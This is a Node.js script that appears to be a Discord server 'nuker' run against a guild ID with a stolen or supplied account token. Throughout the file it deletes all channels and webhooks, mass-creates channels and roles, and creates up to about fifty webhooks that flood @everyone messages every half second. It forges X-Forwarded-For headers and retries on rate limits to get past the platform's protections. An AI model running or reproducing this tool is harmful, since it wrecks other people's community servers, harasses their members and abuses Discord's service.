const got = require('got');
const randstr = require('randomstring');

const chalk = require('chalk');

const logo = `
██████╗ ██╗   ██╗██████╗     ██████╗ ██╗███████╗
██╔══██╗██║   ██║██╔══██╗    ██╔══██╗██║██╔════╝
██║  ██║██║   ██║██████╔╝    ██║  ██║██║███████╗
██║  ██║██║   ██║██╔══██╗    ██║  ██║██║╚════██║
██████╔╝╚██████╔╝██████╔╝    ██████╔╝██║███████║
╚═════╝  ╚═════╝ ╚═════╝     ╚═════╝ ╚═╝╚══════╝
                                NODEJS X WEARERAINBOWHAT

Usage : node Dub_Dis.js <guild-id>
`

if (process.argv.length != 3){
    console.log(chalk.hex("#ffc0cb").bold(logo));
    process.exit(0);
}

console.log(chalk.cyanBright(`

----------------------------------
STARTING ALL METHOD...
----------------------------------
METHODS | ALL
METHOD01 | DELETECHANNELS
METHOD02 | DELETEWEBHOOKS
METHOD03 | SPAMEROLES
METOHD04 | SPAMCHANNELS
METHOD05 | SPAMWEBHOOK
----------------------------------

`));

console.log(chalk.yellowBright + "Starting...");


const tokenwow = require('./token.json').sumthing;

const guildid = process.argv[2];

let webhooklimit = 0;

started();

function spoof(){
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

// setInterval(async () => {
//     for (let index = 0; index < 50; index++) {
//         await createchannel(index);
//     }
// }, 2000);

function started(){
    got.get(`https://discord.com/api/v9/guilds/${guildid}/channels`, {
        // "http2":true,
        "headers":{
            "authorization": tokenwow,
            "Cache-Control": "max-age=0",
            "X-Forwarded-For":spoof()
        }
    }).then((res) => {
        const sumthing = JSON.parse(res.body);
        sumthing.forEach(async (element) => {
            await deletechannel(element.id);
        });
        setTimeout(async () => {
            await getallwebhook();
            setTimeout(() => {
                setInterval(async () => {
                    for (let index = 0; index < 25; index++) {
                        await createchannel(index);
                        await spamrole();
                    }
                }, 250);
            }, 2500);
        }, 2500);
    }).catch((err) => {
        console.log(chalk.red("[!] ") + chalk.magentaBright("Permission Denied"));
    });
}

function spamrole(){
    got.post(`https://discord.com/api/v9/guilds/${guildid}/roles`, {
        // "http2":true,
        "headers":{
            "authorization": tokenwow,
            "Cache-Control": "max-age=0",
            "X-Forwarded-For":spoof()
        },
        json: {
			name:`NODEJS X WEARERAINBOWHAT`
		},
		responseType: 'json'
    }).then((res) => {
        console.log(chalk.greenBright("[!] ") + chalk.whiteBright("Spamed Role"));
    }).catch((err) => {
        console.log(chalk.red("[!] ") + chalk.magentaBright("Permission Denied or Rate Limited"));
        setTimeout(() => {
            return spamrole();
        }, 1000);
    });
}

function deletechannel(chanid){
    got.delete(`https://canary.discord.com/api/v9/channels/${chanid}`, {
        // "http2":true,
        "headers":{
            "authorization": tokenwow,
            "Cache-Control": "max-age=0",
            "X-Forwarded-For":spoof()
        }
    }).then((res) => {
        console.log(chalk.greenBright("[!] ") + chalk.redBright("Deleted Channel : ") + chalk.yellowBright(chanid));
    }).catch((err) => {
        console.log(chalk.red("[!] ") + chalk.magentaBright("Rate Limited"));
        setTimeout(() => {
            return deletechannel(chanid);
        }, 1000);
    });
}

function createchannel(counts){
    got.post(`https://discord.com/api/v9/guilds/${guildid}/channels`, {
		json: {
			name:`NODEJS X WEARERAINBOWHAT`,
            type:0
		},
		responseType: 'json',
        headers:{
            "authorization": tokenwow,
            "Cache-Control": "max-age=0",
            "X-Forwarded-For":spoof()
        }
	}).then((res) => {
        console.log(chalk.greenBright("[!] ") + chalk.redBright("Spamed Channel : ") + chalk.yellowBright(counts));
        if (webhooklimit < 50){
            boomwebhook(res.body.id);
        }
    }).catch((err) => {
        console.log(chalk.red("[!] ") + chalk.magentaBright("Rate Limited"));
        setTimeout(() => {
            return createchannel(counts);
        }, 1000);
    });
}

async function createwebhook(id){
    try {
        const respo = await got.post(`https://discord.com/api/v9/channels/${id}/webhooks`, {
            json: {
                name:`Nodejs X WeAreRainbow ${randstr.generate({ length:3, charset:"0123456789" })}`
            },
            responseType: 'json',
            headers:{
                "authorization": tokenwow,
                "Cache-Control": "max-age=0",
                "X-Forwarded-For":spoof()
            }
        });
        console.log(chalk.greenBright("[!] ") + chalk.yellowBright("Creating Webhook"));
        return `https://discord.com/api/webhooks/${respo.body.id}/${respo.body.token}`
    } catch (e){
        await setTimeout(() => {},2000);
        return createwebhook(id);
    }
}

function floodwebhook(webhok){
    setInterval(() => {
        got.post(webhok, {
            json: {
                content:`@everyone Nodejs X WeAreRainbow ฝากปลดเเบนNodejsด้วยนะจุ๊บๆ`
            },
            responseType: 'json',
            headers:{
                // "authorization": tokenwow,
                "Cache-Control": "max-age=0",
                "X-Forwarded-For":spoof()
            }
        }).then((res) => {
            console.log(chalk.greenBright("[!] ") + chalk.cyanBright("Spamed Webhook"));
        }).catch((err) => {
            console.log(chalk.red("[!] ") + chalk.magentaBright("Rate Limited"));
            setTimeout(() => {
                return floodwebhook(webhok);
            }, 1000);
        });
    },500);
}

function boomwebhook(chanid){
    webhooklimit++;
    if (webhooklimit > 49) {
        return;
    } else {
        createwebhook(chanid).then((link) => {
            floodwebhook(link);
        });
    }
}

function getallwebhook(){
    // https://discord.com/api/v9/guilds/899666638033526815/webhooks
    got.get(`https://discord.com/api/v9/guilds/${guildid}/webhooks`, {
        // "http2":true,
        "headers":{
            "authorization": tokenwow,
            "Cache-Control": "max-age=0",
            "X-Forwarded-For":spoof()
        }
    }).then((res) => {
        const sum2thing = JSON.parse(res.body);
        // console.log(sum2thing[0]);
        if (sum2thing[0] == undefined || sum2thing[0] == null){
            console.log(chalk.red("[!] ") + chalk.magentaBright("Webhooks Not Found!"))
        } else {
            console.log(chalk.greenBright("[!] ") + chalk.yellowBright("Found",sum2thing.length,"Webhooks"))
            sum2thing.forEach(async (ele) => {
                await deletewebhook(ele.id);
            });
        }
    }).catch((err) => {
        console.log(chalk.red("[!] ") + chalk.magentaBright("Rate Limited"));
        setTimeout(() => {
            return getallwebhook();
        }, 1000);
    });
}

function deletewebhook(webhookid){
    got.delete(`https://discord.com/api/v9/webhooks/${webhookid}`, {
        // "http2":true,
        "headers":{
            "authorization": tokenwow,
            "Cache-Control": "max-age=0",
            "X-Forwarded-For":spoof()
        }
    }).then((res) => {
        console.log(chalk.greenBright("[!] ") + chalk.redBright("Deleted Webhook : ") + chalk.yellowBright(webhookid));
    }).catch((err) => {
        console.log(chalk.red("[!] ") + chalk.magentaBright("Rate Limited"));
        setTimeout(() => {
            return deletewebhook(webhookid);
        }, 1000);
    });
}